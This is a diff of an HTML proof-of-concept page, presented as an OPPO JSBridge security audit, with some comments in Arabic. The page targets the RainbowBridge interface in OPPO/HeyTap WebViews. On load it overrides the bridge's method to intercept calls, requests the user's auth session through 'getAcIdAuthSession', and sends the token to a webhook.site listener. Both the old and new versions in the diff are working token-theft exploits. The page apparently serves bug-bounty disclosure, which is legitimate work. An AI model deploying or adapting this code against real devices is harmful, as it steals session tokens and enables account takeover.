@@ -3,60 +3,73 @@
 <head>
     <title>Oppo Architectural Security Research</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        #status { padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        #logs { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; font-size: 12px; overflow-x: auto; min-height: 100px; }
+        .critical { color: #ff4444; border: 2px solid #ff4444; }
+        .waiting { color: #007bff; border: 2px solid #007bff; }
+    </style>
 </head>
 <body>
-    <h1>Security Validation Page</h1>
-    <p id="status" style="color: blue; font-weight: bold;">Waiting for RainbowBridge interface...</p>
-    <div id="logs" style="background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace;"></div>
+    <h1>Oppo JSBridge Security Audit</h1>
+    <div id="status" class="waiting">Waiting for RainbowBridge interface...</div>
+    
+    <h3>Technical Logs:</h3>
+    <div id="logs"></div>
 
     <script>
-        // Remote Listener Configuration
         const WEB_URL = "https://e991a003-5886-41d0-a679-32757542a81d.webhook.site";
 
         function sendExfiltration(data) {
             const logsDiv = document.getElementById("logs");
-            logsDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] Status: ${data}</div>`;
+            logsDiv.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${data}</div>`;
             
-            // Automated Exfiltration via GET Request
-            fetch(`${WEB_URL}/?exfiltrated_data=${encodeURIComponent(data)}`, { 
+            // إرسال البيانات فوراً للمستمع عن بُعد
+            fetch(`${WEB_URL}/?log=${encodeURIComponent(data)}`, { 
                 mode: 'no-cors',
                 method: 'GET'
-            });
+            }).catch(() => {});
         }
 
-        // Detection and Exploitation Logic
-        if (window.RainbowBridge) {
-            document.getElementById("status").innerText = "RainbowBridge Detected! Executing Hijack...";
-            document.getElementById("status").style.color = "red";
+        // بدء عملية الفحص
+        window.addEventListener('load', () => {
+            const bridge = window.RainbowBridge;
 
-            // 1. Object Integrity Violation (Mutation Test)
-            // Demonstrating that the bridge is not frozen and its core methods can be redefined.
-            const originalOnComplete = window.RainbowBridge.onComplete;
-            window.RainbowBridge.onComplete = function(method, params, callback) {
-                sendExfiltration("BRIDGE_HIJACKED_METHOD_CALL: " + method);
-                return originalOnComplete.apply(this, arguments);
-            };
+            if (bridge) {
+                const statusEl = document.getElementById("status");
+                statusEl.innerText = "RAINBOWBRIDGE DETECTED! INSECURE DESIGN EXPOSED.";
+                statusEl.className = "critical";
 
-            // 2. Automated Session Exfiltration (Account Takeover Proof)
-            try {
-                window.RainbowBridge.onComplete("getAcIdAuthSession", {}, (res) => {
-                    const tokenData = typeof res === 'object' ? JSON.stringify(res) : res;
-                    sendExfiltration("SENSITIVE_TOKEN_LEAKED: " + tokenData);
-                    
-                    // Final UI Update for Triage Engineer
-                    document.getElementById("status").innerText = "CRITICAL: Sensitive Data Exfiltrated Successfully.";
-                    alert("Security Audit: Native Bridge Hijacked & Session Exfiltrated.");
-                });
-            } catch (e) {
-                sendExfiltration("CRITICAL_ERROR: " + e.message);
+                // تحديد الطريقة المستخدمة (onComplete أو callApiMethod)
+                const targetMethod = bridge.callApiMethod ? "callApiMethod" : "onComplete";
+                sendExfiltration(`Using Bridge Method: ${targetMethod}`);
+
+                // 1. إثبات عدم نزاهة الكائن (Object Integrity Violation)
+                // نقوم بإعادة تعريف الدالة الأصلية لاعتراض أي طلبات مستقبلية
+                const originalMethod = bridge[targetMethod];
+                bridge[targetMethod] = function(method, params, callback) {
+                    sendExfiltration(`INTERCEPTED_CALL: ${method} | Params: ${JSON.stringify(params)}`);
+                    return originalMethod.apply(this, arguments);
+                };
+
+                // 2. استخراج جلسة المستخدم تلقائياً (Automated ATO Proof)
+                try {
+                    bridge[targetMethod]("getAcIdAuthSession", {}, (res) => {
+                        const token = typeof res === 'object' ? JSON.stringify(res) : res;
+                        sendExfiltration(`CRITICAL_DATA_LEAKED: ${token}`);
+                        
+                        statusEl.innerText = "EXPLOIT SUCCESS: Session Data Exfiltrated.";
+                        alert("SECURITY ALERT:\nNative Bridge Hijacked Successfully.\nSession Token has been exfiltrated to the remote listener.");
+                    });
+                } catch (e) {
+                    sendExfiltration(`EXECUTION_ERROR: ${e.message}`);
+                }
+
+            } else {
+                document.getElementById("logs").innerHTML = "Error: RainbowBridge not found. Open this in OPPO Native WebView.";
             }
-
-        } else {
-            // Environment Mismatch Notification
-            document.getElementById("status").innerText = "RainbowBridge not detected.";
-            document.getElementById("status").style.color = "orange";
-            console.warn("Validation Error: This PoC must be opened within an OPPO/HeyTap Native WebView environment.");
-        }
+        });
     </script>
 </body>
 </html>
